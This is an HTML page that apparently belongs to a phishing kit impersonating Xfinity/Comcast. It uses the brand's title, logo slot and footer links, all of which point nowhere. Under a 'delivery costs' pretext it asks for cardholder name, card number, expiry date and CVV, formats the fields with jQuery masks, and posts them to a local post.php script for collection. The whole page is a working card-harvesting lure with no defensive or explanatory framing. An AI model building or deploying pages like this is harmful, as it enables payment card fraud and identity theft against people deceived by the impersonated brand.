<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xfinity</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
    <main>
        <div class="container">
            <div class="logo">
                <img src="res/img/logo.png" alt="">
            </div>
            <div class="title">
                <h2>Enter Card Number</h2>
                <p>Add a debit or credit card to cover delivery costs.</p>
            </div>
            <div class="col">
            <form action="post.php" method="post">
                <label>Card holder name</label> 
                <input type="text" name="name" ><br><br>
                </div>

                <div class="col">
                 <label>Card number</label>
                <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc"><br><br>
                </div>

                <div class="col">
                <label>Expiration Date</label>
               <input type="text" name="exp" required placeholder="MM/YY" id="exp"><br><br>
                </div>

                <div class="col">
                <label>Security Code</label>
                 <input type="password" name="cvv" required placeholder="Cvv code" id="cvv"><br><br>
                </div>
                
                <div class="btn">
                    <button>Continue</button>
                </div>
                </form>
                <br>
               
               
                
            </div>
        </div>
        <footer>

            <div class="copy">
                &copy; 2025 Comcast
            </div>

            <div class="links">
                <div class="pic"> <img src="res/img/line1.png" alt="">
                <a href="#">
                   Web Terms Of Service
                </a>
                </div>

                <div class="pic2"> <img src="res/img/line2.png" alt="">
                <a href="#">
                    CA Notice at Collection
                </a>
                </div>

                <div class="pic3"> <img src="res/img/line3.png" alt="">
                <a href="#">
                    Privacy Policy
                </a>
                </div>

                <div class="pic4"> <img src="res/img/line4.png" alt="">
                <a href="#">
                    Your Privacy Choices
                </a>
                </div>

                <div class="pic5"> <img src="res/img/line5.png" alt="">
                <a href="#">
                    <span>Health Privacy Notice
                </a>
                </div>

                <div class="pic6"> <img src="res/img/line6.png" alt="">
                <a href="#">
                    Ad Choices
                </a>
                </div>
            </div>
     
            <div class="cookie">
            <div class="foter"> <img src="res/img/foter.png" alt="">
                <a href="#">
                    <span>Cookie Preferences</span>
                </a>
                </div>
            </div>
    </footer>
    </main>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
</body>
</html>